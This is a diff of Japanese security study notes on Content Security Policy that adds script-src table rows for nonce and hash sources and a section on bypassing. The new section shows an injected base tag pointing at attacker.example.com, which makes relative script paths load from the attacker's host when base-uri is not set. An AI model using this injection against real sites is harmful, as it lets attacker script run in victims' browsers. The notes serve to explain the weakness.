@@ -52,17 +52,17 @@ script-src 'self' 'unsafe-inline'
 |---|---|
 |'none'|あらゆるスクリプト|
 |'self'|参照している HTML と Same-Origin であるスクリプトの実行を許可する|
-|host-source: |ホスト名や IP アドレス、URLによって指定されたサーバーから配信されるスクリプトの実行を許可する。|
-|'host-souce' 'nonce-<base64-value\>'
-
-
+|*host-source:* |ホスト名や IP アドレス、URLによって指定されたサーバーから配信されるスクリプトの実行を許可する。|
+|'host-souce' 'nonce-\<base64-value\>'|Base64 形式の Nonce (使い捨ての乱数) を用いてスクリプトの実行を許可する。許可対象とするスクリプト要素の nonce 属性と同じ値にならない場合、そのスクリプトは実行されない。|
+|'host-souce' '\<hash-algorithm\>-\<base64-value\>'|Base64形式のハッシュ値を用いてスクリプトの実行を許可する。ハッシュ値はスクリプトの内容をハッシュ化したもの。外部リソースの場合はスクリプトの integrity 属性にそのスクリプトのハッシュ値を入れる。|
+|
 
 **connect-src** : script interfaces API (XMLHttpRequest や Fetch API のこと) を介して通信可能なURLの制限を定義するディレクティブ。connect-src ディレクティブの値として指定されたURL以外のアクセスは禁止される。
 
 **default-src** : Fetch Directives に属するディレクティブのフォールバックとして機能する。
 [developer.mozilla.org CSP: default-src](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy/default-src)
 
-**base-uri** : base要素で可能なドキュメントのそうたいURLの起点を制限するディレクティブ。**none** なら安全
+**base-uri** : base要素で可能なドキュメントの相対URLの起点を制限するディレクティブ。**none** なら安全
 
 ## Bypassing
 
@@ -70,4 +70,9 @@ script-src 'self' 'unsafe-inline'
 
 ### ディレクティブの設定不備により脆弱性が生まれるパターン
 
-**base-uri** : base要素で可能なドキュメントのそうたいURLの起点を制限するディレクティブ。
+**base-uri** 設定不備の際
+```html
+<base href="http://attacker.example.com">
+```
+とすることでそれ以下の\<script src="/test.js"\>となっている箇所を
+http://attacker.example.com/test.js と参照先を変えることが可能
